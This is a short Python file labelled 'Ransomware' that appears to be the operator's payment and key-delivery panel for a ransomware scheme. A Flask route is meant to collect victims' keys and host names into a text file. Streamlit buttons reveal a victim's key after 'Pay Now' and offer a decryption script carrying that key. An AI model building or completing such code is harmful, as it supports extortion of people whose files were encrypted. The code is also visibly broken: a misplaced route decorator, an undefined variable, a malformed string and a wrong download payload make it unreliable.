from flask import Flask, request
import tkinter as tk
import streamlit as st

app = Flask(__name__)

@app.route('/', methods=['POST'])

#Build the GUI.
#The gui is supposed to display the key and the host name.
# The gui will also allow the user to download the decryption script.


def gui():
    #Create a button that says pay now and will return the key and host name
    if st.button("Pay Now"):

        #Print the latest entry in the data.txt file
        with open('data.txt', 'r') as f:
            lines = f.readlines()
            #Split the line into a list
            lines = lines[-1].split()
            #Print the key and host name
            key = lines[0]
            host = lines[1]
            st.write("Key: " + key)
            st.write("Host Name: " + host)
    if st.button("Download Decryption Script"):
        #Edit the decryption script to include the key and host name
        with open('decryptor.py', 'r') as f:
            lines = f.readlines()
            lines[0] = "key = " + """ + key + """
        # Add code to download decryption script here
        st.download_button(label="Download", data="decryptor", file_name="data.txt", mime="text/plain")
        pass

def store_data():
    # This function can remain the same
    data = request.get_json()
    with open('data.txt', 'a') as f:
        f.write(str(data) + '\n')
    return "Data stored successfully"

if __name__ == '__main__':
    st.title("Ransomware")
    st.write("You are still beautiful")
    gui()
